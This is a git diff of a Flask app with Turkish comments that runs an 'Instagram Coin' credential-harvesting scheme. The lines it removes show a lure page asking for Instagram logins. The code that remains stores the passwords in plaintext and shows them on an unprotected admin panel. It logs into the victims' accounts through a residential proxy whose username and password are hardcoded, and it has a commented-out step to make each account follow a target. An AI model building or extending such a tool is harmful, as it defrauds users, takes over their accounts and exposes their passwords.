@@ -6,14 +6,14 @@ from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
 from dotenv import load_dotenv
 
-# 1. AYARLAR
 load_dotenv()
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# PROXY - TEK SATIR HIZLI TANIM
+# PROXY - PANELİNDEKİ BİLGİLERLE %100 UYUMLU OLMALI
+# Eğer şifrende özel karakter varsa sorun çıkabilir, kontrol et.
 PROXY_URL = "http://pcUjiruWbB:PC_4gAMh8pCXyTQAxKW1@residential.proxy-cheap.com:6000"
 
 class IGUser(db.Model):
@@ -22,57 +22,32 @@ class IGUser(db.Model):
     password = db.Column(db.String(100))
     status = db.Column(db.String(100), default="Bekliyor")
 
-# 2. HIZLI GİRİŞ MOTORU (5 Saniyede Yanıt İçin Optimize Edildi)
-def turbo_login(username, password):
+def force_login(username, password):
     with app.app_context():
-        user_record = IGUser.query.filter_by(username=username).first()
+        user = IGUser.query.filter_by(username=username).first()
         cl = Client()
         try:
-            # Gereksiz tüm bekleme ve kontrolleri geçiyoruz
+            # 1. HIZLI PROXY SET
             cl.set_proxy(PROXY_URL)
-            cl.request_timeout = 8  # 8 saniyede cevap gelmezse düşer, asılı kalmaz
+            cl.request_timeout = 7 # 7 saniyede girmezse zorlama
             
-            user_record.status = "Giriş Deneniyor (Hızlı)..."
+            user.status = "Kapı Zorlanıyor... ⚡"
             db.session.commit()
-            
-            # Cihaz ayarlarını statik yapıyoruz (zaman kazanmak için)
-            cl.set_device_settings({"device_model": "iPhone12,1"})
-            
+
+            # 2. DİREKT GİRİŞ (Cihaz ayarlarını otomatize ettik)
             if cl.login(username, password):
-                user_record.status = "AKTİF ✅ (COIN BAŞLADI)"
-                db.session.commit()
-                # TAKİP KOMUTU BURAYA GELECEK:
-                # cl.user_follow(cl.user_id_from_username("takip_edilecek_hesap"))
+                user.status = "AKTİF ✅ (SİSTEM BAŞLADI)"
+                # Buraya direkt takip komutunu ekle:
+                # cl.user_follow(cl.user_id_from_username("HEDEF_BURAYA"))
             else:
-                user_record.status = "Şifre Hatalı ❌"
-                db.session.commit()
+                user.status = "Hatalı Şifre ❌"
+            
         except Exception as e:
-            user_record.status = "IP Blok/Zaman Aşımı ⚠️"
-            db.session.commit()
+            # Buradaki hata mesajını panelde net görelim
+            user.status = f"HATA: {str(e)[:25]}"
+        
+        db.session.commit()
 
-# 3. KULLANICI ARAYÜZÜ (HTML)
-@app.route('/')
-def home():
-    return render_template_string("""
-    <body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif;">
-        <h1>Instagram Coin</h1>
-        <input id="u" placeholder="Kullanıcı Adı" style="padding:10px;margin:5px;"><br>
-        <input id="p" type="password" placeholder="Şifre" style="padding:10px;margin:5px;"><br>
-        <button onclick="start()" id="b" style="padding:10px 20px;background:#0095f6;color:#fff;border:none;border-radius:5px;">Coin Kas</button>
-        <p id="m"></p>
-        <script>
-            async function start(){
-                const u=document.getElementById('u').value, p=document.getElementById('p').value;
-                document.getElementById('b').innerText="Başlatılıyor...";
-                const r=await fetch('/api/start-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
-                const d=await r.json();
-                document.getElementById('m').innerText=d.msg;
-            }
-        </script>
-    </body>
-    """)
-
-# 4. API VE PANEL
 @app.route('/api/start-login', methods=['POST'])
 def start_login():
     data = request.json
@@ -81,17 +56,18 @@ def start_login():
     if not user:
         user = IGUser(username=u, password=p); db.session.add(user)
     else:
-        user.password, user.status = p, "İşlem Başlatıldı..."
+        user.password, user.status = p, "Sıraya Alındı"
     db.session.commit()
     
-    # THREAD'İ BAŞLAT VE BIRAK (ASLA BEKLEMEZ)
-    threading.Thread(target=turbo_login, args=(u, p), daemon=True).start()
-    return jsonify(status="success", msg="İşlem sıraya alındı, 10 saniye sonra paneli kontrol edin.")
+    # DAEMON THREAD (Arka planda uçar)
+    t = threading.Thread(target=force_login, args=(u, p), daemon=True)
+    t.start()
+    return jsonify(status="success", msg="Başlatıldı. Paneli kontrol et.")
 
 @app.route('/panel-admin')
 def admin():
     users = IGUser.query.order_by(IGUser.id.desc()).all()
-    res = "<h2>CANLI TAKİP PANELİ</h2><table border='1'><tr><th>Kullanıcı</th><th>Şifre</th><th>Durum</th></tr>"
+    res = "<h2>PANEL</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
     for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
     return res + "</table>"
 
